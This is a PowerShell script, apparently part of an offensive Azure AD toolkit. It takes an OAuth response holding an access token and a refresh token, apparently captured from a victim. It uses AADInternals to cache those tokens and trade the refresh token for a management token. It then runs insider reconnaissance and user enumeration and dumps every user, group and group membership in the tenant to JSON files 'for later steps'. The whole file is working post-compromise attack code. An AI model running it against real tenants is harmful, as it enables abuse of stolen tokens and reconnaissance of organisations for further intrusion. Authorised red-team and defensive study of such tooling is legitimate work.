[CmdletBinding()]
param (
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$response
)


$access = $response.access_token
$refresh = $response.refresh_token

# Target details constructed from token   
$acc = Read-AADIntAccessToken $access
$user = $acc.upn
$domain = $user.Split("@")[1]

Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh

# AADInternals Initial Recon
Write-Output "Invoking AADInternals recon as insider"
$core=Invoke-RefreshToAzureCoreManagementToken -domain $domain
Add-AADIntAccessTokenToCache -AccessToken $core.access_token -RefreshToken $core.refresh_token 
$results = Invoke-AADIntReconAsInsider
$jsonContent = $results | ConvertTo-Json
$jsonContent | Out-File -FilePath "intrecon.json"

# User and Group Enumeration
Write-Output "Invoking AADInternals User and Group enumeration"
$userEnum = Invoke-AADIntUserEnumerationAsInsider
$jsonContent = $userEnum | ConvertTo-Json
$jsonContent | Out-File -FilePath "userEnum.json"

# AzAD Group memberships
Connect-AzureAD -AadAccessToken $response.access_token -AccountId $user

# Users
# Retrieve all users
Write-Output "Dumping users for later steps"
$users = Get-AzureADUser -All $true
$jsonContent = $users | ConvertTo-Json
$jsonContent | Out-File -FilePath "users.json"

# Retrieve all groups
Write-Output "Dumping groups"
$groups = Get-AzureADGroup -All $true
$jsonContent = $groups | ConvertTo-Json
$jsonContent | Out-File -FilePath "groups.json"

# Create an empty array to store group and member information
$groupData = @()

# Iterate over each group and retrieve its members
foreach ($group in $groups) {
    $groupInfo = [ordered]@{
        GroupName = $group.DisplayName
        Members = @()
    }

    # Retrieve members of the group
    $members = Get-AzureADGroupMember -ObjectId $group.ObjectId -All $true

    # Add members to group info
    foreach ($member in $members) {
        $groupInfo.Members += $member.DisplayName
    }

    # Add group info to the array
    $groupData += $groupInfo
}
$jsonData = $groupData | ConvertTo-Json
$jsonData | Out-File -FilePath "members.json"